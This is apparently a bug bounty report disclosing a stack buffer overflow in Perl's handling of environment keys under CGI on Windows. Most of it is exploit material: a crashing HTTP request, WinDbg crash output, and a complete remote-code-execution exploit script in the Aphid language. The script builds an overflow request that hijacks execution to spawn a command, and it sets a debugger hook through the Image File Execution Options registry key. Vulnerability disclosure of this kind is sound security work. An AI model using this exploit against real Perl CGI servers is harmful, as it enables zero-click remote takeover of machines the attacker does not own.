title: Perl $ENV Key Stack Buffer Overflow

profile.name: Internet Bug Bounty
profile.about: The Internet Bug Bounty rewards security research into vulnerabilities impacting Open Source Software Projects.

activities.message:
I have confirmed this vulnerability is remotely exploitable on Windows HTTP servers using CGI Perl. Exploitation is zero-click, requiring no interaction on part of the target, making this wormable. This vulnerability is highly critical.

```
GET http://localhost/cgi-bin/perltest.cgi HTTP/1.1
: test
User-Agent: Fiddler
Host: localhost
```

```
0:000> r
eax=ffffffff ebx=41414141 ecx=fa9ff136 edx=00fbedf4 esi=41414141 edi=6e410041
eip=6e39aa33 esp=0060fbd4 ebp=00fbcad8 iopl=0         nv up ei pl nz na po nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010202
perl526!Perl_drand48_r+0x4d53:
6e39aa33 8b8330030000    mov     eax,dword ptr [ebx+330h] ds:002b:41414471=????????
0:000> !peb
PEB at 00384000
    InheritedAddressSpace:    No
    ReadImageFileExecOptions: No
    BeingDebugged:            Yes
    ImageBaseAddress:         00400000
    Ldr                       77967c00
    Ldr.Initialized:          Yes
    Ldr.InInitializationOrderModuleList: 00723cb8 . 00724f20
    Ldr.InLoadOrderModuleList:           00723d90 . 00729310
    Ldr.InMemoryOrderModuleList:         00723d98 . 00729318
    [...]
    CommandLine:  'C:\xampp\perl\bin\perl.exe C:/xampp/cgi-bin/perltest.cgi'
    DllPath:      '< Name not readable >'
    Environment:  00720ae0
       [...]
        HTTP_
        HTTP_USER_AGENT=Fiddler
        HTTP_HOST=localhost
```

Exploit:
```
////////////////////////////////////////////////////////////////
// Perl ENV Overflow Remote Code Execution Exploit
// Exploit written in Aphid. To run, compile the interpreter from source:
// https://github.com/John-Leitch/Aphid
////////////////////////////////////////////////////////////////
using Microsoft.Win32;
#'Std';
#'Tcp';
#'Query';
#'Meta';

perl = getBlock() |> aq.last |> evalNode;

config = {
    target: 'http://localhost/cgi-bin/perltest.cgi?foo={0}',
    eip: perl.Perl_do_spawn_nowait,
    arg: perl.cmdStr,
    blockCount: 0x42b,
    debugger: 'c:\\debuggers\\windbg.exe -c "{0} g"',
};

setBreakpoints = @{
    bps = $args.Count != 0 ? 
        $args->uint->@string.Format("bp 0x{0:x8};")+>@+$args[1] :
        '';
    
    Registry.SetValue(
        'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT' + 
            '\\CurrentVersion\\Image File Execution Options\\Perl.exe',
        'Debugger',
        bps @string.Format(config.debugger),
        RegistryValueKind.String);
};

toStr =
    Convert.ToUInt32
    @> BitConverter.GetBytes
    @> @aq.select(Convert.ToChar)
    @> @aq.aggr(@(x, y) x + y);

c = config;
setBreakpoints(c.eip);
blockParts = [ c.arg, c.eip ];
block = blockParts->toStr+>@+$args[1];
blocks = block * (c.blockCount / (blockParts.Count * 0x4));

req = 
    'GET ' + (blocks @string.Format(c.target)) + 'HTTP/1.1\r\n' + 
    'Host: localhost\r\n' + 
    '\r\n';

req |> print;

c = tcp.connect('localhost', 80);
c.write(req);

print('done');
exit(0);
```
